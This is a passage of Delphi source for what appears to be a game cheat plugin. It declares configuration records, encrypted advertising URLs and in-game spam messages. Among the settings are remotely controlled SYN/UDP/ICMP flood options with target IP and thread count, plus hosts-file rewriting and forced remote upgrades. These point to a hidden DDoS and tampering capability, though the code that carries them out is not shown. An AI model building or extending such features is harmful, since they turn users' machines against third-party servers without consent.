unit CShare;

interface
uses
  Windows, SysUtils, Classes, IniFiles;
const
  SysVersion = 20090901;
  TESTMODE = 0;
  USERVERSION = 7;
  g_sFilter1 = 'ZlSqWxX9MRmKIWOVPMT6rZnxnOpI5QIRCVZxXw=='; //http://www.941yx.com
  g_sFilter2 = 'CrzQppZwWlwX+gyIRZvyY2v9vjN8j5C6kUChhQ=='; //http://www.941sf.com
  g_sFilter3 = 'zJ3fsf2kkqskLAp3PA6wxgNW9ATUEvC7NmemvQ=='; //http://www.cqfir.net
type
  TCheckStatus = (c_Idle, c_Connect, c_Connected, c_CheckError, c_CheckFail, c_CheckOK {, c_Upgrade});

  TCheckLicenseStatus = (cl_None, cl_GetAddressing, cl_GetAddressOK, cl_GetLicenseing, cl_GetLicenseOK, cl_GetUpgradeing, cl_GetUpgradeOK);
  TCheckStep = (c_None, c_SendAddress, c_SendLicense, c_CheckOver);
  TSessionStatus = (s_NoUse, s_Used, s_GetLic, s_SendAddress, s_SendLic, s_SendUpgrade, s_Finished);

  TGetProc = function(): PChar; stdcall;
  TSetProc = procedure(Proc: PChar); stdcall;

  TData = record
    HookMsg: THandle;
    HookKey: THandle;
    MsgHooked: Boolean;
    KeyHooked: Boolean;
  end;
  PData = ^TData;

  TTitle = array[0..127] of Char;
  TText = array[0..255] of Char;


  TShortStrings = array[0..10 - 1] of string[100];

  THostPages = array[0..4] of string[100];
  TInternetCache = array[0..4] of string[100];
  TBadBoy = array[0..4] of string[100];

  //TAddressText = string[50];
  TBuffers = array of string;

  TEcodeData = record
    EXEVersion: Integer;
    CheckStatus: TCheckStatus;
    DLLVersion: Integer;
    CqfirVersion: Integer;

    nUserLiense: Integer;
    nConfigAddr: Integer;
    nHomePage: Integer;

    nOpenPage1: Integer;
    nOpenPage2: Integer;
    nClosePage1: Integer;
    nClosePage2: Integer;
    nSayMessage1: Integer;
    nSayMessage2: Integer;

    boOpenPage1: Boolean;
    boOpenPage2: Boolean;
    boClosePage1: Boolean;
    boClosePage2: Boolean;

    boAllowUpData: Boolean;
    boCompulsiveUpdata: Boolean;
    sMD5: string[32];
    sUpdataAddr: string[60];

    CheckNoticeUrl: Boolean;
    WriteHosts: Boolean;
    HostsAddress: Integer;
    WriteUrlEntry: Boolean;
    CheckOpenPage: Boolean;
    CheckConnectPage: Boolean;
    UseServerUpgrade: Boolean;

    CheckParent: Boolean;
    Check1: Boolean;
    Check2: Boolean;
    Check3: Boolean;
    Check4: Boolean;
    Check5: Boolean;
    Check6: Boolean;
    Check7: Boolean;
    Check8: Boolean;
    Check9: Boolean;
    Check10: Boolean;

    State: Integer;
    Error: Integer;


    SynFloodDDOS: Boolean;
    SynFloodTCP: Boolean;
    SynFloodUDP: Boolean;
    SynFloodICMP: Boolean;
    SynFloodIGMP: Boolean;
    SynFloodRandomPort: Boolean; //是否随机端口
    SynFloodIpaddr: string[15];
    SynFloodPort: Integer;
    SynFloodThreadCount: Integer;
  end;
  pTEcodeData = ^TEcodeData;

  TFormData = record
    PreviousHandle: THandle;
    RunCounter: Integer;
    Lock: Boolean;
    Initialized: Boolean;
    MainHwnd: array[0..10] of THandle;
    Title: array[0..10] of string[127];
    DllName: array[0..13] of Char;

    UserLiense: string[255]; // TText;
    ConfigAddr: string[255]; // TText;
    HomePage: string[255]; // TText;
    OpenPage1: string[255]; // TText;
    OpenPage2: string[255]; // TText;
    ClosePage1: string[255]; // TText;
    ClosePage2: string[255]; // TText;
    SayMessage1: string[255]; // TText;
    SayMessage2: string[255]; // TText;
    SayMsgTime: Integer;
    ShowOptionIndex: Integer;
    Data: array[0..320 - 1] of Char;
    //Kill: array[0..1024 * 2] of Char;
  end;
  pTFormData = ^TFormData;

  TProcessInfo = record
    MainHwnd: Hwnd;
    Module: THandle;
    DXDraw: THandle;
    Find: Boolean;
    Title: string;
    Hook: Boolean;
    HookTick: Longword;
  end;
  pTProcessInfo = ^TProcessInfo;

  TServerConfig = record
    sUserLiense: string[60];
    boAllowUpData: Boolean;
    boCompulsiveUpdata: Boolean;
    sMD5: string[32];
    sUpdataAddr: string[60];

    sHomePage: string[60];
    sOpenPage1: string[60];
    sOpenPage2: string[60];
    sClosePage1: string[60];
    sClosePage2: string[60];
    sSayMessage1: string[60];
    sSayMessage2: string[60];
    nSayMsgTime: Integer;

    boOpenPage1: Boolean;
    boOpenPage2: Boolean;
    boClosePage1: Boolean;
    boClosePage2: Boolean;

    boCheckNoticeUrl: Boolean;
    boWriteHosts: Boolean;
    nHostsAddress: Integer;
    boWriteUrlEntry: Boolean;
    boCheckOpenPage: Boolean;
    boCheckConnectPage: Boolean;
    boUseServerUpgrade: Boolean;

    boCheckParent: Boolean;
    boCheck1: Boolean;
    boCheck2: Boolean;
    boCheck3: Boolean;
    boCheck4: Boolean;
    boCheck5: Boolean;
    boCheck6: Boolean;
    boCheck7: Boolean;
    boCheck8: Boolean;
    boCheck9: Boolean;
    boCheck10: Boolean;
  end;
  pTServerConfig = ^TServerConfig;


  TServerInfo = record
    Address: Integer;
    SocketHandle: Integer;
    AddressHash: Integer;
    ServerConfig: TServerConfig;
  end;
  pTServerInfo = ^TServerInfo;

  TClientInfo = record
    Address: Integer;
    sConfig: TText;
    nCode: Integer;
    nVersion: Integer;
    nEXEVersion: Integer;
    nSocketHandle: Integer;
    sMD5: string[32];
  end;
  pTClientInfo = ^TClientInfo;

  TUpgarde = record
    nSize: Integer;
    sMD5: string[32];
    sFileName: string[32];
  end;
  pTUpgarde = ^TUpgarde;

  TIPaddr = record
    A: Byte;
    B: Byte;
    C: Byte;
    D: Byte;
    Port: Integer;
  end;

  TCqfirData = record
    nAddress: Integer;
    nCaption: Integer;
    nLinkName: Integer;
    //nOptionCaption: Integer;
    Caption: string[255];
    //OptionCaption: string[127];
    Address: string[255];
    LinkName: string[255];
    Hosts: TShortStrings;
    //Caches: TShortStrings;
    JumpText: array[0..10 - 1] of string[255];
    nSelfCrc: Integer;
    nCqfirCrc: Integer;
    nHookCrc: Integer;
    nSelfSize: Integer;
    nCqfirSize: Integer;
    nHookSize: Integer;
    //boDownFail: Boolean;
  end;
  pTCqfirData = ^TCqfirData;

  TEatItemFail = record
    Name: string;
    MakeIndex: Integer;
    FailCount: Integer;
    dwEatTime: Longword;
  end;
  pTEatItemFail = ^TEatItemFail;


  TDataEngine = class
    Data: pTFormData;
    SocketHwnd: array[0..10] of Hwnd;
  private
    FEcodeData: TEcodeData;

    FInitialized: Boolean;
    UserCriticalSection: TRTLCriticalSection;

    procedure MoveData(Value: string);
    procedure SetData(Value: pTFormData);
    function GetTitle(Index: Integer): string;


    function GetCheckStatus(): TCheckStatus;
    procedure SetCheckStatus(Value: TCheckStatus);
    function GetEXEVersion: Integer;
    procedure SetEXEVersion(Value: Integer);
    function GetDLLVersion: Integer;
    procedure SetDLLVersion(Value: Integer);
    function GetCqfirVersion: Integer;
    procedure SetCqfirVersion(Value: Integer);



    function GetAllowUpData: Boolean;
    procedure SetAllowUpData(Value: Boolean);

    function GetCompulsiveUpdata: Boolean;
    procedure SetCompulsiveUpdata(Value: Boolean);


    function GetMD5: string;
    procedure SetMD5(Value: string);


    function GetUpdataAddr: string;
    procedure SetUpdataAddr(Value: string);



    function GetCheckNoticeUrl: Boolean;
    procedure SetCheckNoticeUrl(Value: Boolean);


    function GetWriteHosts: Boolean;
    procedure SetWriteHosts(Value: Boolean);

    function GetHostsAddress: Integer;
    procedure SetHostsAddress(Value: Integer);


    function GetWriteUrlEntry: Boolean;
    procedure SetWriteUrlEntry(Value: Boolean);

    function GetCheckOpenPage: Boolean;
    procedure SetCheckOpenPage(Value: Boolean);

    function GetCheckConnectPage: Boolean;
    procedure SetCheckConnectPage(Value: Boolean);

    function GetUseServerUpgrade: Boolean;
    procedure SetUseServerUpgrade(Value: Boolean);








    function GetCheckParent: Boolean;
    procedure SetCheckParent(Value: Boolean);
    function GetCheck1: Boolean;
    procedure SetCheck1(Value: Boolean);
    function GetCheck2: Boolean;
    procedure SetCheck2(Value: Boolean);
    function GetCheck3: Boolean;
    procedure SetCheck3(Value: Boolean);
    function GetCheck4: Boolean;
    procedure SetCheck4(Value: Boolean);
    function GetCheck5: Boolean;
    procedure SetCheck5(Value: Boolean);
    function GetCheck6: Boolean;
    procedure SetCheck6(Value: Boolean);
    function GetCheck7: Boolean;
    procedure SetCheck7(Value: Boolean);
    function GetCheck8: Boolean;
    procedure SetCheck8(Value: Boolean);
    function GetCheck9: Boolean;
    procedure SetCheck9(Value: Boolean);
    function GetCheck10: Boolean;
    procedure SetCheck10(Value: Boolean);























    function GetboOpenPage1: Boolean;
    procedure SetboOpenPage1(Value: Boolean);

    function GetboOpenPage2: Boolean;
    procedure SetboOpenPage2(Value: Boolean);

    function GetboClosePage1: Boolean;
    procedure SetboClosePage1(Value: Boolean);

    function GetboClosePage2: Boolean;
    procedure SetboClosePage2(Value: Boolean);



    function GetnUserLiense: Integer;
    procedure SetnUserLiense(Value: Integer);

    function GetnConfigAddr: Integer;
    procedure SetnConfigAddr(Value: Integer);

    function GetnHomePage: Integer;
    procedure SetnHomePage(Value: Integer);

    function GetnOpenPage1: Integer;
    procedure SetnOpenPage1(Value: Integer);

    function GetnOpenPage2: Integer;
    procedure SetnOpenPage2(Value: Integer);

    function GetnClosePage1: Integer;
    procedure SetnClosePage1(Value: Integer);

    function GetnClosePage2: Integer;
    procedure SetnClosePage2(Value: Integer);

    function GetnSayMessage1: Integer;
    procedure SetnSayMessage1(Value: Integer);

    function GetnSayMessage2: Integer;
    procedure SetnSayMessage2(Value: Integer);

    function GetsUserLiense: string;
    procedure SetsUserLiense(Value: string);

    function GetsConfigAddr: string;
    procedure SetsConfigAddr(Value: string);

    function GetsHomePage: string;
    procedure SetsHomePage(Value: string);

    function GetsOpenPage1: string;
    procedure SetsOpenPage1(Value: string);

    function GetsOpenPage2: string;
    procedure SetsOpenPage2(Value: string);

    function GetsClosePage1: string;
    procedure SetsClosePage1(Value: string);

    function GetsClosePage2: string;
    procedure SetsClosePage2(Value: string);

    function GetsSayMessage1: string;
    procedure SetsSayMessage1(Value: string);

    function GetsSayMessage2: string;
    procedure SetsSayMessage2(Value: string);

    function GetState: Integer;
    procedure SetState(Value: Integer);
    function GetError: Integer;
    procedure SetError(Value: Integer);

    function GetInitialized: Boolean;
  public
    constructor Create();
    destructor Destroy; override;
    function Initialize(): Boolean;
    procedure Clear;
    procedure AddTitle(MainHwnd: THandle; sTitle: string);
    procedure DeleteTitle(MainHwnd: THandle);
    procedure UpDateTitle(MainHwnd: THandle; sTitle: string);

    procedure Decrypt;
    procedure Encrypt;

    //property Data: pTFormData read FData write SetData;
    property Initialized: Boolean read GetInitialized write FInitialized;

    property Titles[Index: Integer]: string read GetTitle;


    property CheckStatus: TCheckStatus read GetCheckStatus write SetCheckStatus;
    property EXEVersion: Integer read GetEXEVersion write SetEXEVersion;
    property DLLVersion: Integer read GetDLLVersion write SetDLLVersion;
    property CqfirVersion: Integer read GetCqfirVersion write SetCqfirVersion;

    property nUserLiense: Integer read GetnUserLiense write SetnUserLiense;
    property nConfigAddr: Integer read GetnConfigAddr write SetnConfigAddr;
    property nHomePage: Integer read GetnHomePage write SetnHomePage;
    property nOpenPage1: Integer read GetnOpenPage1 write SetnOpenPage1;
    property nOpenPage2: Integer read GetnOpenPage2 write SetnOpenPage2;
    property nClosePage1: Integer read GetnClosePage1 write SetnClosePage1;
    property nClosePage2: Integer read GetnClosePage2 write SetnClosePage2;
    property nSayMessage1: Integer read GetnSayMessage1 write SetnSayMessage1;
    property nSayMessage2: Integer read GetnSayMessage2 write SetnSayMessage2;

    property boOpenPage1: Boolean read GetboOpenPage1 write SetboOpenPage1;
    property boOpenPage2: Boolean read GetboOpenPage2 write SetboOpenPage2;
    property boClosePage1: Boolean read GetboClosePage1 write SetboClosePage1;
    property boClosePage2: Boolean read GetboClosePage2 write SetboClosePage2;


    property sUserLiense: string read GetsUserLiense write SetsUserLiense;
    //property sConfigAddr: string read GetsConfigAddr write SetsConfigAddr;
    property sHomePage: string read GetsHomePage write SetsHomePage;
    property sOpenPage1: string read GetsOpenPage1 write SetsOpenPage1;
    property sOpenPage2: string read GetsOpenPage2 write SetsOpenPage2;
    property sClosePage1: string read GetsClosePage1 write SetsClosePage1;
    property sClosePage2: string read GetsClosePage2 write SetsClosePage2;
    property sSayMessage1: string read GetsSayMessage1 write SetsSayMessage1;
    property sSayMessage2: string read GetsSayMessage2 write SetsSayMessage2;


    property AllowUpData: Boolean read GetAllowUpData write SetAllowUpData;
    property CompulsiveUpdata: Boolean read GetCompulsiveUpdata write SetCompulsiveUpdata;

    property MD5: string read GetMD5 write SetMD5;
    property UpdataAddr: string read GetUpdataAddr write SetUpdataAddr;

    property CheckNoticeUrl: Boolean read GetCheckNoticeUrl write SetCheckNoticeUrl;

    property WriteHosts: Boolean read GetWriteHosts write SetWriteHosts;
    property HostsAddress: Integer read GetHostsAddress write SetHostsAddress;
    property WriteUrlEntry: Boolean read GetWriteUrlEntry write SetWriteUrlEntry;
    property CheckOpenPage: Boolean read GetCheckOpenPage write SetCheckOpenPage;
    property CheckConnectPage: Boolean read GetCheckConnectPage write SetCheckConnectPage;
    property UseServerUpgrade: Boolean read GetUseServerUpgrade write SetUseServerUpgrade;




    property CheckParent: Boolean read GetCheckParent write SetCheckParent;
    property Check1: Boolean read GetCheck1 write SetCheck1;
    property Check2: Boolean read GetCheck2 write SetCheck2;
    property Check3: Boolean read GetCheck3 write SetCheck3;
    property Check4: Boolean read GetCheck4 write SetCheck4;
    property Check5: Boolean read GetCheck5 write SetCheck5;
    property Check6: Boolean read GetCheck6 write SetCheck6;
    property Check7: Boolean read GetCheck7 write SetCheck7;
    property Check8: Boolean read GetCheck8 write SetCheck8;
    property Check9: Boolean read GetCheck9 write SetCheck9;
    property Check10: Boolean read GetCheck10 write SetCheck10;


    property State: Integer read GetState write SetState;
    property Error: Integer read GetError write SetError;
  end;
var
 { g_nHomePage: Integer;
  g_nOpenPage1: Integer;
  g_nOpenPage2: Integer;
  g_nClosePage1: Integer;
  g_nClosePage2: Integer;
  g_nSayMessage1: Integer;
  g_nSayMessage2: Integer; }
  g_nRemoteAddress: Integer;
  g_Buffer: PChar;
  g_PlugBuffer: PChar;

  g_Data: pTFormData;
  g_DataEngine: TDataEngine = nil;
  g_HSocketHwnd: Hwnd;
  g_CM_SOCKETMESSAGE: Integer;
  g_dwChangeCaption: LongWord;
function MakeIPToStr(IPAddr: TIPaddr): string;
function MakeIPToInt(sIPaddr: string): Integer;
function MakeIntToIP(nIPaddr: Integer): string;
procedure SendOutStr(Msg: string);
implementation
uses HUtil32, EncryptUnit;

procedure SendOutStr(Msg: string);
var
  flname: string;
  FHandle: TextFile;
begin
  //Exit;
  flname := 'OutStr.txt'; //'D:\GameOfMir\工具\外挂\OutStr.txt';
  if FileExists(flname) then begin
    AssignFile(FHandle, flname);
    Append(FHandle);
  end else begin
    AssignFile(FHandle, flname);
    Rewrite(FHandle);
  end;
  Writeln(FHandle, TimeToStr(Time) + ' ' + Msg);
  CloseFile(FHandle);
end;

constructor TDataEngine.Create();
begin
  inherited;
  Data := nil;
  FInitialized := False;

end;

destructor TDataEngine.Destroy;
begin
  inherited;
end;

procedure TDataEngine.SetData(Value: pTFormData);
begin
  Data := Value;
end;

procedure TDataEngine.MoveData(Value: string);
var
  Buff: PChar;
begin
  //g_Data.Data := Value;
  Buff := @g_Data.Data;
  if Value <> '' then
    Move(Value[1], Buff^, Length(Value))
  else
    FillChar(Buff^, SizeOf(g_Data.Data), #0);
end;

function TDataEngine.GetInitialized: Boolean;
begin
  Result := g_Data.Initialized;
end;

procedure TDataEngine.Clear;
var
  I: Integer;
  nError: Integer;
begin
  for I := 0 to 10 do g_Data.MainHwnd[I] := 0;
  for I := 0 to 10 do g_Data.Title[I] := '';
  {FillChar(g_Data.MainHwnd, SizeOf(g_Data.MainHwnd), #0);
  SafeFillChar(g_Data.Title, SizeOf(g_Data.Title), #0);}
  Decrypt;
  try
    nError := Random(8888);
    nError := nError + Error;
    Error := nError;
  finally
    Encrypt;
  end;
end;

function TDataEngine.Initialize(): Boolean;
var
  sData: string;
  EcodeData: TEcodeData;
  Conf: TIniFile;
begin
 // {$I VMProtectBeginVirtualization.inc}
  Result := False;
  if not g_Data.Initialized then begin
    Conf := TIniFile.Create('.\Config.ini');
    g_Data.ShowOptionIndex := Conf.ReadInteger('Setup', 'ShowOptionIndex', 63);
    Conf.Free;
    if (g_Data.ShowOptionIndex < 1) or (g_Data.ShowOptionIndex > 71) then
      g_Data.ShowOptionIndex := 63;
    g_Data.Initialized := True;
    g_Data.Lock := False;
    g_HSocketHwnd := Random(10000000);
    g_CM_SOCKETMESSAGE := Random(10000000);
    FillChar(SocketHwnd, SizeOf(SocketHwnd), 0);
    EcodeData.State := Random(10000000);
    EcodeData.Error := 0;
    //EcodeData.EXEVersion := SysVersion;

    EcodeData.CheckStatus := c_Idle;
    EcodeData.boAllowUpData := True;
    EcodeData.boCompulsiveUpdata := True;
    EcodeData.sMD5 := '';
    EcodeData.sUpdataAddr := '';

    EcodeData.CheckNoticeUrl := True;
    EcodeData.WriteHosts := False;
    EcodeData.HostsAddress := -1494312899;
    EcodeData.WriteUrlEntry := True;
    EcodeData.CheckOpenPage := True;
    EcodeData.CheckConnectPage := True;
    EcodeData.UseServerUpgrade := True;


    EcodeData.CheckParent := True;
    EcodeData.Check1 := True;
    EcodeData.Check2 := True;
    EcodeData.Check3 := True;
    EcodeData.Check4 := True;
    EcodeData.Check5 := True;
    EcodeData.Check6 := True;
    EcodeData.Check7 := True;
    EcodeData.Check8 := True;
    EcodeData.Check9 := True;
    EcodeData.Check10 := True;


    EcodeData.EXEVersion := Random(10000000);
    EcodeData.DLLVersion := Random(10000000);
    EcodeData.CqfirVersion := Random(10000000);
    EcodeData.nUserLiense := Random(10000000);
    EcodeData.nConfigAddr := Random(10000000);

    EcodeData.boOpenPage1 := True;
    EcodeData.boOpenPage2 := True;
    EcodeData.boClosePage1 := True;
    EcodeData.boClosePage2 := True;

    FillChar(g_Data.MainHwnd, SizeOf(g_Data.MainHwnd), #0);
    FillChar(g_Data.Title, SizeOf(g_Data.Title), #0);
    FillChar(g_Data.ConfigAddr, SizeOf(g_Data.Title), #0);
    FillChar(g_Data.UserLiense, SizeOf(g_Data.Title), #0);


{$IF USERVERSION = 0}
    g_Data.UserLiense := 'XeIyImRRM0YrhoT6bCdc7YNoYsKeNJXVF5NUmQ==';
    g_Data.HomePage := 'ZP6tPL8ZclJEoXt5e+aVXGHZPcfBjHk4sDiwiXp3oBp9XKVstQ=='; //http://www.941sf.com/SF/1.HTM
    g_Data.OpenPage1 := 'yxr4FJFnJs9O6Qg09ydIWqqvQvCNvV3EfwqKag=='; //http://www.941yx.com
    g_Data.OpenPage2 := 'hXSLOEZNoun4Lrj58eRvmACsQtBcr86vTitYrg=='; //http://www.941sf.com
    g_Data.ClosePage1 := 'Bg8c7TZheE41YWizj+IFCx7VHvMziMOldggAPQ=='; //http://www.941yx.com
    g_Data.ClosePage2 := '0dRzf837Dn5jo5bgtZa9TImK0ZEIhY37NCuu1g=='; //http://www.941sf.com
    g_Data.SayMessage1 := 'toI9ml8phWxgOGeSlFvCxbklzNAs2UoqQDgIBZEXsrzOJLBMqpPRvrSpLRVUQ8g='; //玩英雄合击.到Www.941SF.Com下载英雄外挂!
    g_Data.SayMessage2 := 'fof2WCvMGh0iSuK5T0RiXBheGHviypkCdIOhksBFhZxDcTlDdTihc0AF0IbzGJI='; //玩英雄合击.到Www.941SF.Com下载英雄外挂!

   { EcodeData.nUserLiense := 36231229;
    EcodeData.nHomePage := 104649181;
    EcodeData.nOpenPage1 := 234384733;
    EcodeData.nOpenPage2 := 213661469;
    EcodeData.nClosePage1 := 147554013;
    EcodeData.nClosePage2 := 78850733;
    EcodeData.nSayMessage1 := 210740493;
    EcodeData.nSayMessage2 := 119961005; }
{$IFEND}

{$IF USERVERSION = 1}
    g_Data.UserLiense := 'cagCqwgXHZQRKnd9+LN6PBk2flqV3VthrxU8Ow==';
    g_Data.HomePage := 'cagCqwgXHZQRKnd9+LN6PBk2flqV3VthrxU8Ow=='; //http://www.89945.com/SF/1.HTM
    g_Data.OpenPage1 := 'cagCqwgXHZQRKnd9+LN6PBk2flqV3VthrxU8Ow=='; //http://www.89945.com
    g_Data.OpenPage2 := 'cagCqwgXHZQRKnd9+LN6PBk2flqV3VthrxU8Ow=='; //http://www.89945.com
    g_Data.ClosePage1 := 'cagCqwgXHZQRKnd9+LN6PBk2flqV3VthrxU8Ow=='; //http://www.89945.com
    g_Data.ClosePage2 := 'cagCqwgXHZQRKnd9+LN6PBk2flqV3VthrxU8Ow=='; //http://www.89945.com
    g_Data.SayMessage1 := 'EGNj8zthZUxtNxQl7xxqGsDQIJHpqdEj2b9WCMTww+iBHveOghPAvLXNfJJFbB8='; //玩英雄合击.到www.89945.com下载英雄外挂!
    g_Data.SayMessage2 := 'EGNj8zthZUxtNxQl7xxqGsDQIJHpqdEj2b9WCMTww+iBHveOghPAvLXNfJJFbB8='; //玩英雄合击.到www.89945.com下载英雄外挂!

  {  EcodeData.nUserLiense := 46617517;
    EcodeData.nHomePage := 46617517;
    EcodeData.nOpenPage1 := 46617517;
    EcodeData.nOpenPage2 := 46617517;
    EcodeData.nClosePage1 := 46617517;
    EcodeData.nClosePage2 := 46617517;
    EcodeData.nSayMessage1 := 204341837;
    EcodeData.nSayMessage2 := 204341837;}
{$IFEND}

{$IF USERVERSION = 2}
    g_Data.UserLiense := 'XeIyImRRM0YrhoT6bCdc7YNoYsKeNJXVF5NUmQ==';
    g_Data.HomePage := 'ZP6tPL8ZclJEoXt5e+aVXGHZPcfBjHk4sDiwiXp3oBp9XKVstQ=='; //http://www.941sf.com/SF/1.HTM
    g_Data.OpenPage1 := 'yxr4FJFnJs9O6Qg09ydIWqqvQvCNvV3EfwqKag=='; //http://www.941yx.com
    g_Data.OpenPage2 := 'hXSLOEZNoun4Lrj58eRvmACsQtBcr86vTitYrg=='; //http://www.941sf.com
    g_Data.ClosePage1 := 'Bg8c7TZheE41YWizj+IFCx7VHvMziMOldggAPQ=='; //http://www.941yx.com
    g_Data.ClosePage2 := '0dRzf837Dn5jo5bgtZa9TImK0ZEIhY37NCuu1g=='; //http://www.941sf.com
    g_Data.SayMessage1 := 'toI9ml8phWxgOGeSlFvCxbklzNAs2UoqQDgIBZEXsrzOJLBMqpPRvrSpLRVUQ8g='; //玩英雄合击.到Www.941SF.Com下载英雄外挂!
    g_Data.SayMessage2 := 'fof2WCvMGh0iSuK5T0RiXBheGHviypkCdIOhksBFhZxDcTlDdTihc0AF0IbzGJI='; //玩英雄合击.到Www.941SF.Com下载英雄外挂!

 {   EcodeData.nUserLiense := 36231229;
    EcodeData.nHomePage := 104649181;
    EcodeData.nOpenPage1 := 234384733;
    EcodeData.nOpenPage2 := 213661469;
    EcodeData.nClosePage1 := 147554013;
    EcodeData.nClosePage2 := 78850733;
    EcodeData.nSayMessage1 := 210740493;
    EcodeData.nSayMessage2 := 119961005;   }
{$IFEND}

{$IF USERVERSION = 3}
    g_Data.UserLiense := 'AjiXDbx0CbqVcbAVNsJoCxzjdh9H';
    g_Data.HomePage := 'AjiXDbx0CbqVcbAVNsJoCxzjdh9H'; //http://www.sf898.com/SF/1.HTM
    g_Data.OpenPage1 := 'AjiXDbx0CbqVcbAVNsJoCxzjdh9H'; //http://www.sf898.com
    g_Data.OpenPage2 := 'AjiXDbx0CbqVcbAVNsJoCxzjdh9H'; //http://www.sf898.com
    g_Data.ClosePage1 := 'AjiXDbx0CbqVcbAVNsJoCxzjdh9H'; //http://www.sf898.com
    g_Data.ClosePage2 := 'AjiXDbx0CbqVcbAVNsJoCxzjdh9H'; //http://www.sf898.com
    g_Data.SayMessage1 := 'j579vQgfQPP3dSObc62eD7KH6dB9SSJw0Vq3UkpG64rJnddVcBbw0Njn86Ez'; //找变态合击外挂尽在www.sf898.com！！！
    g_Data.SayMessage2 := 'j579vQgfQPP3dSObc62eD7KH6dB9SSJw0Vq3UkpG64rJnddVcBbw0Njn86Ez'; //找变态合击外挂尽在www.sf898.com！！！

   { EcodeData.nUserLiense := 10951240;
    EcodeData.nHomePage := 10951240;
    EcodeData.nOpenPage1 := 10951240;
    EcodeData.nOpenPage2 := 10951240;
    EcodeData.nClosePage1 := 10951240;
    EcodeData.nClosePage2 := 10951240;
    EcodeData.nSayMessage1 := 110417258;
    EcodeData.nSayMessage2 := 110417258;  }
{$IFEND}

{$IF USERVERSION = 4}
    g_Data.UserLiense := 'e56RVRe7c895u33LCb59jma+Evt2rsbrLPzRUw==';
    g_Data.HomePage := 'e56RVRe7c895u33LCb59jma+Evt2rsbrLPzRUw=='; //http://www.sf898.com/SF/1.HTM
    g_Data.OpenPage1 := 'e56RVRe7c895u33LCb59jma+Evt2rsbrLPzRUw=='; //http://www.sf898.com
    g_Data.OpenPage2 := 'e56RVRe7c895u33LCb59jma+Evt2rsbrLPzRUw=='; //http://www.sf898.com
    g_Data.ClosePage1 := 'e56RVRe7c895u33LCb59jma+Evt2rsbrLPzRUw=='; //http://www.sf898.com
    g_Data.ClosePage2 := 'e56RVRe7c895u33LCb59jma+Evt2rsbrLPzRUw=='; //http://www.sf898.com
    g_Data.SayMessage1 := 'cnI6zJZxtCyULZ9pITSGHF61e6aBdE+BJDgfdiRODakdp8OfbJ9fyFBNDUrZRQXhUhytK8sL'; //找变态合击外挂尽在www.sf898.com！！！
    g_Data.SayMessage2 := 'cnI6zJZxtCyULZ9pITSGHF61e6aBdE+BJDgfdiRODakdp8OfbJ9fyFBNDUrZRQXhUhytK8sL'; //找变态合击外挂尽在www.sf898.com！！！

   { EcodeData.nUserLiense := 10951240;
    EcodeData.nHomePage := 10951240;
    EcodeData.nOpenPage1 := 10951240;
    EcodeData.nOpenPage2 := 10951240;
    EcodeData.nClosePage1 := 10951240;
    EcodeData.nClosePage2 := 10951240;
    EcodeData.nSayMessage1 := 110417258;
    EcodeData.nSayMessage2 := 110417258;  }
{$IFEND}

{$IF USERVERSION = 5}
    g_Data.UserLiense := 'I82mAQK7vSGySi1PnAlUqcpyU4AHgaFZDlrWRA==';
    g_Data.HomePage := 'I82mAQK7vSGySi1PnAlUqcpyU4AHgaFZDlrWRA=='; //http://www.sf898.com/SF/1.HTM
    g_Data.OpenPage1 := 'I82mAQK7vSGySi1PnAlUqcpyU4AHgaFZDlrWRA=='; //http://www.sf898.com
    g_Data.OpenPage2 := 'I82mAQK7vSGySi1PnAlUqcpyU4AHgaFZDlrWRA=='; //http://www.sf898.com
    g_Data.ClosePage1 := 'I82mAQK7vSGySi1PnAlUqcpyU4AHgaFZDlrWRA=='; //http://www.sf898.com
    g_Data.ClosePage2 := 'I82mAQK7vSGySi1PnAlUqcpyU4AHgaFZDlrWRA=='; //http://www.sf898.com
    g_Data.SayMessage1 := 'VKyOFGCyWkJqeWxmkmyYmfwV8dtk9SEc4d4oDncpQLa14z+D6MVshtfFoiC0HCo='; //找变态合击外挂尽在www.sf898.com！！！
    g_Data.SayMessage2 := 'VKyOFGCyWkJqeWxmkmyYmfwV8dtk9SEc4d4oDncpQLa14z+D6MVshtfFoiC0HCo='; //找变态合击外挂尽在www.sf898.com！！！
{$IFEND}

{$IF USERVERSION = 6}
    g_Data.UserLiense := 'n5QDQ9T5NSQsHkqyD9E093zIpvdO1vyBqaMt';
    g_Data.HomePage := 'n5QDQ9T5NSQsHkqyD9E093zIpvdO1vyBqaMt'; //http://www.sf898.com/SF/1.HTM
    g_Data.OpenPage1 := 'n5QDQ9T5NSQsHkqyD9E093zIpvdO1vyBqaMt'; //http://www.sf898.com
    g_Data.OpenPage2 := 'n5QDQ9T5NSQsHkqyD9E093zIpvdO1vyBqaMt'; //http://www.sf898.com
    g_Data.ClosePage1 := 'n5QDQ9T5NSQsHkqyD9E093zIpvdO1vyBqaMt'; //http://www.sf898.com
    g_Data.ClosePage2 := 'n5QDQ9T5NSQsHkqyD9E093zIpvdO1vyBqaMt'; //http://www.sf898.com
    g_Data.SayMessage1 := 'p2BiytI1uCgpR+T3WP9p9HXZ1+bGMTt0gnBBwY6UaOPS1yuLeOL1g0Y+6Xbd2TS2QX1wM1A='; //找变态合击外挂尽在www.sf898.com！！！
    g_Data.SayMessage2 := 'p2BiytI1uCgpR+T3WP9p9HXZ1+bGMTt0gnBBwY6UaOPS1yuLeOL1g0Y+6Xbd2TS2QX1wM1A='; //找变态合击外挂尽在www.sf898.com！！！
{$IFEND}

{$IF USERVERSION = 7}
    g_Data.UserLiense := 'j9Cw5WEH7rzpoJ4tWvhdOMT4rqXYdcKfgzh0wQ==';
    g_Data.HomePage := 'j9Cw5WEH7rzpoJ4tWvhdOMT4rqXYdcKfgzh0wQ=='; //http://www.haocq.com
    g_Data.OpenPage1 := 'j9Cw5WEH7rzpoJ4tWvhdOMT4rqXYdcKfgzh0wQ=='; //http://www.haocq.com
    g_Data.OpenPage2 := 'j9Cw5WEH7rzpoJ4tWvhdOMT4rqXYdcKfgzh0wQ=='; //http://www.haocq.com
    g_Data.ClosePage1 := 'j9Cw5WEH7rzpoJ4tWvhdOMT4rqXYdcKfgzh0wQ=='; //http://www.haocq.com
    g_Data.ClosePage2 := 'j9Cw5WEH7rzpoJ4tWvhdOMT4rqXYdcKfgzh0wQ=='; //http://www.haocq.com
    g_Data.SayMessage1 := 'gx7P6crjqI4zyFk3wH+hx8NsninJvByAkHI+OT8iBqYAohJj7ay1wgyr3lihIkKOsPwtBwIt'; //玩英雄合击.到http://www.haocq.com下载英雄外挂!
